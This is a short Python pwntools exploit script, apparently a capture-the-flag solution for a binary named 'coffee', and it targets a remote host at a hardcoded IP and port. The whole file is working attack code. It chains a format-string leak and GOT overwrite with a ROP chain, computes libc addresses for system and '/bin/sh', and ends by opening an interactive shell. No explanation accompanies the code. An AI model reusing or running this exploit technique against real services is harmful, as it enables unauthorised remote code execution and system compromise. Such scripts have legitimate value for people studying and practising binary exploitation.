from pwn import *

#s = process('./coffee')
#raw_input('DEBUG')

s = remote('34.146.101.4', 30002)

x_value = 0xc0ffee
x_address = 0x404048
puts_got = 0x404018
main = 0x401196
leak = '%29$llx'
leak_offset = 0x270b3
system_offset = 0x55410
bin_sh_offset = 0x1b75aa
writeable = 0x404008
scanf_plt = 0x4010a0
pop_rsi_r15 = 0x401291
pop_rdi = 0x401293
ret = 0x40101a
pop_6 = 0x40128a

payload = b'%020$n' + b'%29$llxA' + b'%4733x' + b'%19$hn' + b'%24731x' + b'%020$n' + b'\x00'

payload += p64(pop_rdi) + p64(writeable) + p64(pop_rsi_r15) + p64(x_address) + p64(0) + p64(scanf_plt) + p64(ret) + p64(main)
payload += p64(puts_got) + p64(writeable)

s.sendline(payload)

libc_base = int(s.recvuntil(b'A').decode('utf-8')[:-1], 16) - leak_offset

s.sendline(p32(x_value))

bin_sh = bin_sh_offset + libc_base
system = system_offset + libc_base

payload = b'A' * 31 + b'\x00'
payload += p64(ret) + p64(ret) + p64(pop_rdi) + p64(bin_sh) + p64(system)

s.sendline(payload)

s.interactive()
